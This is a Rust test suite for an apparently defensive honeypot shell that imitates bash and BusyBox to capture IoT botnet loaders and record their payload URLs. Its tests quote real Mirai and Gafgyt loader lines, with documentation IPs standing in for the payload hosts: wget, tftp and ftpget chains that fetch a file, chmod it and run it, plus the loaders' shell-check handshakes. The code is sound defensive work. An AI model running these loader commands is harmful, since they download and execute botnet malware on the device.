    fn a_redirection_probe_into_a_missing_directory_fails_and_blocks_its_cd() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/nonexistent/.x&&cd /nonexistent;pwd");
        assert_eq!(
            out, "-bash: /nonexistent/.x: No such file or directory\n/root\n",
            "{out:?}"
        );
        assert_eq!(sh.cwd(), "/root");
    }

    #[test]
    fn a_created_file_shows_up_in_a_later_listing() {
        let mut sh = shell();
        sh.handle_input("cd /tmp; >.x");
        let (out, _) = sh.handle_input("ls -a /tmp");
        assert!(out.contains(".x"), "{out:?}");
    }

    #[test]
    fn cd_into_a_directory_the_box_does_not_present_is_refused() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cd /nonexistent");
        assert_eq!(out, "-bash: cd: /nonexistent: No such file or directory\n");
        assert_eq!(sh.cwd(), "/root");
        // Directories the root listing advertises, and ancestors of modeled files, still work.
        assert_eq!(sh.handle_input("cd /proc").0, "");
        assert_eq!(sh.handle_input("cd /bin").0, "");
    }

    /// A file made executable under a `noexec` mount is refused as the kernel refuses it, while
    /// the same steps in an exec-permitted directory run. `/var/run` is `/run` behind a symlink,
    /// so it is refused too.
    #[test]
    fn running_a_chmodded_file_from_a_noexec_mount_is_permission_denied() {
        let mut sh = shell();
        sh.handle_input(">/run/x; chmod +x /run/x");
        let (out, _) = sh.handle_input("/run/x");
        assert_eq!(out, "-bash: /run/x: Permission denied\n");
        assert_eq!(out.status, 126);
        assert_eq!(
            sh.handle_input("/var/run/x").0,
            "-bash: /var/run/x: Permission denied\n"
        );
        sh.handle_input(">/tmp/x; chmod +x /tmp/x");
        assert_eq!(sh.handle_input("/tmp/x").0, "", "/tmp permits exec");

        let mut android = FakeShell::android(
            FakeFs::android(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "adb".to_string(),
                session_id: None,
            },
        );
        android.handle_input(">/sdcard/x; chmod +x /sdcard/x");
        let (out, _) = android.handle_input("/sdcard/x");
        assert_eq!(out, "sh: /sdcard/x: Permission denied\n");
        assert_eq!(out.status, 126);
        android.handle_input(">/data/local/tmp/x; chmod +x /data/local/tmp/x");
        assert_eq!(android.handle_input("/data/local/tmp/x").0, "");
    }

    /// `cat` of a directory says so; it used to claim the directory did not exist.
    #[test]
    fn cat_of_a_directory_says_it_is_a_directory() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cat /etc");
        assert_eq!(out, "cat: /etc: Is a directory\n");
        assert_eq!(out.status, 1);
        assert_eq!(
            sh.handle_input("cat /nonexistent").0,
            "cat: /nonexistent: No such file or directory\n"
        );
        assert_eq!(
            sh.handle_input("cat /bin").0,
            "cat: /bin: Is a directory\n",
            "a symlink to a directory is a directory"
        );
    }

    /// `cd` through a symlink keeps the logical path in `pwd` and the prompt, as bash does, while
    /// files resolve physically.
    #[test]
    fn cd_through_a_symlink_keeps_the_logical_cwd() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /var/run").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/var/run\n");
        assert_eq!(sh.handle_input(">.x").0, "");
        assert_eq!(sh.handle_input("ls -a /run").0, ".x  lock  user\n");
        assert_eq!(sh.handle_input("cd /bin").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/bin\n");
        // The file behind the relative name is the busybox image: its recorded first bytes, and
        // its full recorded length.
        let (out, _) = sh.handle_input("cat busybox");
        assert_eq!(out.bytes().len(), 2_193_272);
        assert_eq!(&out.bytes()[..8], b"\x7fELF\x02\x01\x01\x03");
    }

    #[test]
    fn su_on_a_root_shell_is_silent() {
        assert_eq!(shell().handle_input("su").0, "");
        assert_eq!(shell().handle_input("su -").0, "");
        assert_eq!(shell().handle_input("su root").0, "");
    }

    #[test]
    fn mirai_busybox_probe_returns_applet_not_found() {
        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
        // "<TOKEN>: applet not found" reply before delivering a payload.
        let (out, _) = shell().handle_input("busybox MIRAI");
        assert_eq!(out, "MIRAI: applet not found\n");
    }

    #[test]
    fn busybox_echo_still_passes_the_gafgyt_handshake() {
        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn sh_dash_c_runs_the_inner_command() {
        let (out, _) = shell().handle_input("sh -c \"id\"");
        assert!(out.contains("uid=0(root)"), "got: {out}");
    }

    #[test]
    fn busybox_wget_is_captured_as_a_download() {
        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("busybox wget must emit a file_download event");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
    }

    #[test]
    fn download_target_recognizes_direct_and_busybox_forms() {
        assert_eq!(
            download_target(&["wget", "http://x/y"]).as_deref(),
            Some("http://x/y")
        );
        // Previously asserted `Some("x")` - the FILENAME - which was the defect: a scheme-less
        // fragment the fetcher cannot parse. The host and file are separate tokens; the url is
        // synthesized from both.
        assert_eq!(
            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]).as_deref(),
            Some("tftp://10.0.0.1/x")
        );
        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
        assert_eq!(download_target(&["ls", "-la"]), None);
    }

    #[test]
    fn download_target_captures_full_path_fetch_forms() {
        // Loaders routinely invoke fetchers by absolute path; `download_target` must resolve the
        // basename like `dispatch` does, or the `honeypot_file_download` evidence is silently lost
        // for these while the shell still answers them in-persona. Scheme-less tftp is the case the
        // `url_if_fetch_line` URL-scheme fallback cannot rescue.
        assert_eq!(
            download_target(&[
                "/bin/busybox",
                "tftp",
                "-g",
                "-r",
                "payload.arm",
                "198.51.100.9"
            ])
            .as_deref(),
            Some("tftp://198.51.100.9/payload.arm")
        );
        assert_eq!(
            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]).as_deref(),
            Some("http://198.51.100.9/x")
        );
        // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
        // "applet not found" to the persona, so it must not be recorded as a fetch.
        assert_eq!(
            download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
            None
        );
    }

    // The exact retrieval lines a live Mirai loader ran against the telnet sensor (documentation
    // address in place of the real payload host). Both had been recorded as the bare host with no
    // scheme, so the fetcher never queued either.
    #[test]
    fn download_target_synthesizes_urls_for_bare_tftp_and_ftpget() {
        // `-g HOST -r FILE`: host before the -r operand.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9", "-r", "tftp"]).as_deref(),
            Some("tftp://198.51.100.9/tftp")
        );
        // `ftpget HOST LOCAL REMOTE`: the remote name is the last positional.
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "f", "ftpget"]).as_deref(),
            Some("ftp://198.51.100.9/ftpget")
        );
        // `ftpget HOST REMOTE` (local name defaulted).
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "bin.arm"]).as_deref(),
            Some("ftp://198.51.100.9/bin.arm")
        );
        // Explicit ports, both syntaxes.
        assert_eq!(
            download_target(&["tftp", "-g", "-r", "x", "198.51.100.9", "6969"]).as_deref(),
            Some("tftp://198.51.100.9:6969/x")
        );
        assert_eq!(
            download_target(&["ftpget", "-P", "2121", "198.51.100.9", "x"]).as_deref(),
            Some("ftp://198.51.100.9:2121/x")
        );
        // `-l` alone names the remote file too (BusyBox behaviour); `-u`/`-p` operands are skipped,
        // never mistaken for the host.
        assert_eq!(
            download_target(&["tftp", "-g", "-l", "local.bin", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9/local.bin")
        );
        assert_eq!(
            download_target(&["ftpget", "-u", "anon", "-p", "x", "198.51.100.9", "f"]).as_deref(),
            Some("ftp://198.51.100.9/f")
        );
        // A host with no file is still evidence; no host at all is not a fetch.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9")
        );
        assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
    }

    /// A loader line seen live 2026-09-03 (host replaced): the output file is named BEFORE the
    /// url, and the whole thing is a `cd` chain with the fetchers in a subshell. It was recorded
    /// as a download of `1.sh`, a bare filename the fetcher could not retrieve.
    #[test]
    fn output_file_named_before_the_url_is_not_mistaken_for_the_url() {
        let line = "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.51.100.9:80/1.sh||busybox wget -q -O 1.sh http://198.51.100.9:80/1.sh||curl -so 1.sh http://198.51.100.9:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok";
        let (_out, events) = shell().handle_input(line);
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(urls, vec!["http://198.51.100.9:80/1.sh"]);

        // Schemeless forms still resolve by position, with option values skipped either way.
        assert_eq!(
            download_target(&["wget", "-q", "-O", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["wget", "-qO", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "a cluster ending in a value-taking letter consumes the next token"
        );
        assert_eq!(
            download_target(&["wget", "-qO-", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "an attached value (`-qO-`) must not consume the url"
        );
        assert_eq!(
            download_target(&["curl", "-so", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["curl", "--output", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
    }

    /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
    /// Each fetcher is wrapped in a `( a || busybox a ) > f; ...` fallback chain, so the fetch verb
    /// is never the line's first token. The wget line was captured on the box; tftp and ftpget
    /// were not, because their URLs have no scheme for the raw-line scan to find.
    #[test]
    fn mirai_fallback_chains_emit_a_download_event_for_every_fetcher() {
        let cases = [
            (
                "(wget http://198.51.100.9/wget -O- || busybox wget http://198.51.100.9/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
                "http://198.51.100.9/wget",
            ),
            (
                "(tftp -g 198.51.100.9 -r tftp -l- || busybox tftp -g 198.51.100.9 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
                "tftp://198.51.100.9/tftp",
            ),
            (
                "(ftpget 198.51.100.9 f ftpget || busybox ftpget 198.51.100.9 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
                "ftp://198.51.100.9/ftpget",
            ),
        ];
        for (line, url) in cases {
            let (_out, events) = shell().handle_input(line);
            let dls: Vec<_> = events
                .iter()
                .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
                .collect();
            assert_eq!(dls.len(), 1, "exactly one download event for: {line}");
            assert_eq!(dls[0].metadata["url"], url, "line: {line}");
        }
    }

    #[test]
    fn simple_commands_split_at_separators_and_stop_at_redirections() {
        assert_eq!(
            simple_commands(
                "(tftp -g h -r x -l- || busybox tftp -g h) > t; chmod 777 t && ./t 2>&1"
            ),
            vec![
                vec!["tftp", "-g", "h", "-r", "x", "-l-"],
                vec!["busybox", "tftp", "-g", "h"],
                vec!["chmod", "777", "t"],
                vec!["./t"],
            ]
        );
        // A `&` inside a query string is part of the URL, not a background operator.
        assert_eq!(
            simple_commands("wget http://h/x?a=1&b=2 -O- & sleep 1"),
            vec![
                vec!["wget", "http://h/x?a=1&b=2", "-O-"],
                vec!["sleep", "1"]
            ]
        );
    }

    #[test]
    fn a_line_fetching_two_different_urls_emits_two_download_events() {
        let (_out, events) = shell().handle_input(
            "wget http://198.51.100.9/a; tftp -g 198.51.100.9 -r b; wget http://198.51.100.9/a",
        );
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(
            urls,
            vec!["http://198.51.100.9/a", "tftp://198.51.100.9/b"],
            "one event per distinct URL, in first-seen order"
        );
    }

    #[test]
    fn a_bare_tftp_line_emits_a_download_event_with_a_real_url() {
        let (_out, events) = shell().handle_input("tftp -g 198.51.100.9 -r tftp");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a bare tftp fetch must emit a download event");
        assert_eq!(dl.metadata["url"], "tftp://198.51.100.9/tftp");
    }

    #[test]
    fn busybox_applet_set() {
        assert!(is_busybox_applet("wget"));
        assert!(is_busybox_applet("sh"));
        assert!(!is_busybox_applet("MIRAI"));
    }

    fn noon() -> chrono::DateTime<chrono::Utc> {
        "2026-09-29T12:00:00Z".parse().unwrap()
    }

    #[test]
    fn the_session_clock_stamps_replies_and_events() {
        let mut sh = shell().with_clock(noon);
        let (out, events) = sh.handle_input("wget http://198.51.100.9/x");
        assert!(
            out.starts_with("--2026-09-29 12:00:00--  http://198.51.100.9/x\n"),
            "{out}"
        );
        assert!(
            out.contains("\n2026-09-29 12:00:00 (1.2 MB/s) - 'x' saved"),
            "{out}"
        );
        assert_eq!(events.len(), 2, "{events:?}");
        assert!(events.iter().all(|e| e.observed_at == noon()));
    }

    #[test]
    fn wget_derives_the_saved_filename_from_the_url() {
        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"], noon());
        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
        assert!(
            !out.contains("index.html"),
            "constant filename tell remains: {out}"
        );
    }

    #[test]
    fn wget_quiet_suppresses_the_banner() {
        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"], noon()), "");
    }

    #[test]
    fn wget_dash_big_o_dash_writes_body_to_stdout() {
        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
        let out = cmd_wget(&["wget", "-qO-", "http://x/y"], noon());
        assert!(out.contains("It works!"), "got: {out}");
    }

    #[test]
    fn curl_dash_big_o_is_silent_on_stdout() {
        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
        // body, a clean one-probe tell.
        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
        // Without -o/-O, curl prints the body to stdout.
        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
    }

    #[test]
    fn ping_is_not_command_not_found() {
        let (out, _) = shell().handle_input("ping 8.8.8.8");
        assert!(out.contains("ping statistics"), "got: {out}");
        assert!(!out.contains("command not found"), "got: {out}");
    }

    #[test]
    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
        let (_, events) =
            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a wget URL inside sh -c must still be captured");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
    }

    #[test]
    fn url_scan_only_fires_with_a_fetch_verb() {
        assert_eq!(
            url_if_fetch_line("wget http://a/b"),
            Some("http://a/b"),
            "fetch verb + url should capture"
        );
        assert_eq!(
            url_if_fetch_line("echo http://a/b"),
            None,
            "a bare echo of a url is not a download"
        );
    }

    #[test]
    fn uname_m_returns_only_the_machine_field() {
        // The #1 IoT-loader recon command: `uname -m` must print exactly the arch, not the whole
        // `uname -a` line (the old shortcut returned uname_all for any flag - a one-probe tell that
        // also broke arch-based payload selection).
        assert_eq!(
            cmd_uname(&["uname", "-m"], crate::shell::ShellFlavor::Bash),
            "x86_64\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-p"], crate::shell::ShellFlavor::Bash),
            "x86_64\n"
        );
    }

    #[test]
    fn uname_single_fields_are_selected_individually() {
        assert_eq!(
            cmd_uname(&["uname", "-s"], crate::shell::ShellFlavor::Bash),
            "Linux\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-r"], crate::shell::ShellFlavor::Bash),
            "5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-n"], crate::shell::ShellFlavor::Bash),
            "server01\n"
        );
    }

    #[test]
    fn uname_combined_flags_print_fields_in_canonical_order() {
        // Multiple flags print the selected fields in coreutils' fixed order regardless of the flag
        // order given.
        assert_eq!(
            cmd_uname(&["uname", "-sr"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-rs"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-s", "-r"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
    }

    #[test]
    fn uname_a_and_bare_keep_their_historical_output() {
        // Regression guard: the forms that were already correct must not change.
        assert_eq!(
            cmd_uname(&["uname", "-a"], crate::shell::ShellFlavor::Bash),
            "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux\n"
        );
        assert_eq!(
            cmd_uname(&["uname"], crate::shell::ShellFlavor::Bash),
            "Linux\n"
        );
    }

    #[test]
    fn chmod_and_drop_chain_verbs_never_say_command_not_found() {
        // `chmod +x x` returning "command not found" is impossible on real Linux and aborts the
        // loader before it runs its payload - the most direct capture-costing tell in the shell.
        let (out, _) = shell().handle_input("chmod +x /tmp/x");
        assert_eq!(out, "");
        // The rest answer as the real commands do: silence on success, the real message on a
        // path that is not there. They used to be silent either way, which is how a loader
        // could `cp` a payload and then not find it.
        for cmd in ["cp /bin/busybox b", "mkdir d", "sleep 1", "rm -f x"] {
            let (o, _) = shell().handle_input(cmd);
            assert_eq!(o, "", "{cmd} should be a silent success, got {o:?}");
        }
        for (cmd, expected) in [
            ("cp a b", "cp: cannot stat 'a': No such file or directory\n"),
            ("rm x", "rm: cannot remove 'x': No such file or directory\n"),
        ] {
            let (o, _) = shell().handle_input(cmd);
            assert_eq!(o, expected, "{cmd}");
            assert!(!o.contains("command not found"));
        }
    }

    /// `cp /bin/busybox x && ./x` is a standard staging step; it needs a busybox to copy.
    #[test]
    fn the_binaries_a_loader_copies_exist_and_are_executable() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("cp /bin/busybox ./b").0, "");
        // The copy is busybox started under the name `b`, which is not an applet: the reference
        // system answers `.bb: applet not found` to the same chain (status 127).
        let (out, _) = sh.handle_input("./b");
        assert_eq!(out, "b: applet not found\n", "the copy runs");
        assert_eq!(out.status, 127);
        assert_eq!(sh.handle_input("ls /tmp").0, "b\n");
    }

    #[test]
    fn busybox_chmod_dispatches_instead_of_applet_not_found() {
        // The banner advertises chmod; `busybox chmod` must run it, not contradict the banner.
        let (out, _) = shell().handle_input("busybox chmod +x x");
        assert_eq!(out, "");
    }

    #[test]
    fn busybox_banner_and_applet_set_never_contradict() {
        // Both are derived from BUSYBOX_APPLETS, so every advertised applet is recognized and every
        // recognized applet is advertised - the banner-vs-applet contradiction is impossible.
        let banner = busybox_banner();
        for applet in BUSYBOX_APPLETS {
            assert!(
                is_busybox_applet(applet),
                "{applet} advertised but not recognized"
            );
            assert!(
                banner.contains(applet),
                "{applet} recognized but not advertised"
            );
        }
        // curl is not a real BusyBox applet, so `busybox curl` is applet-not-found and it is absent
        // from the banner.
        assert!(!is_busybox_applet("curl"));
        assert!(!banner.contains("curl"));
        let (out, _) = shell().handle_input("busybox curl http://x/y");
        assert!(out.contains("curl: applet not found"), "got: {out}");
    }

    #[test]
    fn redirect_truncates_stdout_into_a_file() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("echo hi > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "hi\n");
        // A second `>` replaces the content rather than extending it.
        assert_eq!(sh.handle_input("echo yo > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "yo\n");
        // A command that prints nothing still truncates, as the shell opens the file first.
        assert_eq!(sh.handle_input("true > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "");
    }

    #[test]
    fn redirect_append_adds_to_existing() {
        let mut sh = shell();
        sh.handle_input("echo a > /tmp/f");
        assert_eq!(sh.handle_input("echo b >> /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "a\nb\n");
    }

    #[test]
    fn busybox_echo_redirect_writes_one_newline_and_prints_nothing() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("/bin/busybox echo > /tmp/.fxcat").0, "");
        assert_eq!(sh.handle_input("cat /tmp/.fxcat").0, "\n");
        let r = sh.handle_input("sh /tmp/.fxcat").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
    }

    #[test]
    fn sh_of_a_missing_file_gives_the_dash_open_error() {
        let mut sh = shell();
        let r = sh.handle_input("sh /tmp/nope").0;
        assert_eq!(r, "sh: 0: cannot open /tmp/nope: No such file\n");
        assert_eq!(r.status, 2);
    }

    #[test]
    fn sh_dash_c_with_an_empty_script_is_not_a_file_open() {
        let mut sh = shell();
        let r = sh.handle_input("sh -c \"\"").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
    }

    #[test]
    fn stderr_redirect_discards_via_dev_null_and_merges_via_2to1() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0, "");
        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0.status, 2);
        assert_eq!(sh.handle_input("ls /missing_q > /tmp/o 2>&1").0, "");
        assert_eq!(
            sh.handle_input("cat /tmp/o").0,
            "ls: cannot access '/missing_q': No such file or directory\n"
        );
    }

    #[test]
    fn redirect_target_is_created_even_when_the_command_fails() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        assert_eq!(
            sh.handle_input("cat /missing_q > /tmp/.bb").0,
            "cat: /missing_q: No such file or directory\n"
        );
        assert_eq!(sh.handle_input("chmod 755 /tmp/.bb").0, "");
        assert_eq!(sh.handle_input("/tmp/.bb").0, "");
    }

    #[test]
    fn redirect_into_a_missing_directory_errors_and_blocks_the_command() {
        let mut sh = shell();
        let r = sh.handle_input("echo hi > /nope/f").0;
        assert_eq!(r, "-bash: /nope/f: No such file or directory\n");
        assert_eq!(r.status, 1);
        assert!(sh.handle_input("ls /nope").0.contains("No such file"));
    }
}
